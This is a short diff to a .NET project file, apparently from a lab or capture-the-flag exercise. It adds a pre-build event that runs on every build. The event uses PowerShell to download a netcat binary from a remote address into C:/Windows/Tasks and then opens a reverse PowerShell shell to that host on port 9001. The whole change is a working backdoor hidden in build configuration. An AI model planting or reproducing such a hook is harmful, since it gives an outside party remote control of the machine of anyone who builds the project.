@@ -3,6 +3,9 @@
 	<PropertyGroup>
 		<TargetFramework>net6.0</TargetFramework>
 		<LangVersion>preview</LangVersion>
+		<PreBuildEvent>powershell.exe -c "curl http://10.10.14.28:8080/nc64.exe -o
+C:/Windows/Tasks/nc.exe; C:/Windows/Tasks/nc.exe 10.10.14.28 9001 -e powershell"
+		</PreBuildEvent>	
 	</PropertyGroup>
 
 	<ItemGroup>
